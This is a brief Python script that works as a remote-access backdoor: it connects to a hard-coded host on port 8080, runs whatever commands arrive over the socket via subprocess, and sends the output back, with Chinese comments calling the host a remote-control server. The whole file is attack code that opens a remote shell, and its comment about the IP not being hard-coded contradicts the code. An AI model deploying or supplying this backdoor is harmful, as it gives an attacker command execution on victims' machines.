#!/usr/bin/env python3
import sys
import subprocess
from socket import socket


def exec(cmd):
    try:
        process = subprocess.Popen([cmd],
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
        return process.communicate()
    except Exception as ex:
        print(ex)


def main():
    # 不写死是防止远程服务器被封后就失效
    ip = "192.168.1.109" or sys.argv[1]
    with socket() as tcp_socket:
        # 连接远控服务器
        tcp_socket.connect((ip, 8080))
        while True:
            data = tcp_socket.recv(2048)
            if data:
                cmd = data.decode("utf-8")
                stdout, stderr = exec(cmd)
                if stderr:
                    tcp_socket.send(stderr)
                if stdout:
                    tcp_socket.send(stdout)


if __name__ == "__main__":
    main()
